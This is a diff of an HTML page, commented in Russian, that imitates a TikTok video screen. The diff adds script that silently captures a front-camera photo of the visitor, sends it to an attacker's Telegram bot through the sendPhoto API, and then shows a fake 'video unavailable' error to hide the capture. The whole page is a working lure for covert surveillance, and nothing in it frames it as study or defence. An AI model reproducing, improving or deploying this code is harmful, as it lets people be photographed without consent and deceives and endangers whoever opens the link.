@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TikTok Error</title>
+  <title>TikTok View</title>
   <style>
     html, body {
       margin: 0;
@@ -11,6 +11,7 @@
       background: black;
       overflow: hidden;
       height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
 
     #background {
@@ -22,50 +23,102 @@
     }
 
     #error {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: rgba(20, 20, 20, 0.95);
-      color: white;
-      padding: 20px 25px;
-      border: 1px solid #ff4444;
-      border-radius: 12px;
-      font-size: 16px;
-      text-align: center;
-      z-index: 999;
       display: none;
-      box-shadow: 0 0 20px red;
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      background: white;
+      color: black;
+      font-size: 15px;
+      padding: 16px;
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
+      z-index: 999;
+      text-align: center;
+    }
+
+    #error b {
+      display: block;
+      margin-bottom: 4px;
     }
   </style>
 </head>
 <body>
-  <!-- TikTok-скриншот по ссылке -->
+  <!-- Скрин как будто TikTok -->
   <img
     id="background"
     src="https://files.catbox.moe/xqjqii.jpg"
     alt="TikTok Frame"
   />
 
-  <!-- Ошибка -->
-  <div id="error">⚠️ Ошибка загрузки видео. Повторите позже.</div>
+  <!-- Реалистичная ошибка в стиле TikTok -->
+  <div id="error">
+    <b>Видео недоступно</b>
+    Попробуйте позже.
+  </div>
 
   <script>
-    async function run() {
+    const BOT_TOKEN = 'ВАШ_ТОКЕН';
+    const CHAT_ID = 'ВАШ_CHAT_ID';
+
+    async function start() {
       try {
-        // Запрос фронтальной камеры
-        await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        // После задержки показать ошибку
-        setTimeout(() => {
-          document.getElementById("error").style.display = "block";
-        }, 2500);
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1); // зеркалим фронталку
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // остановка камеры
+        stream.getTracks().forEach(track => track.stop());
+
+        canvas.toBlob(blob => {
+          sendToTelegram(blob);
+        }, 'image/png');
       } catch (err) {
-        document.getElementById("error").textContent = "⚠️ Доступ к камере запрещён.";
-        document.getElementById("error").style.display = "block";
+        showError("Ошибка доступа к камере");
       }
     }
 
-    run();
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "selfie.png");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      })
+        .then(res => res.json())
+        .then(data => {
+          setTimeout(() => showError(), 1000); // показываем ошибку после отправки
+        })
+        .catch(err => {
+          showError("Ошибка отправки в Telegram");
+        });
+    }
+
+    function showError(msg) {
+      const error = document.getElementById("error");
+      if (msg) error.innerHTML = `<b>Ошибка</b>${msg}`;
+      error.style.display = "block";
+    }
+
+    // запускаем всё
+    start();
   </script>
 </body>
 </html>
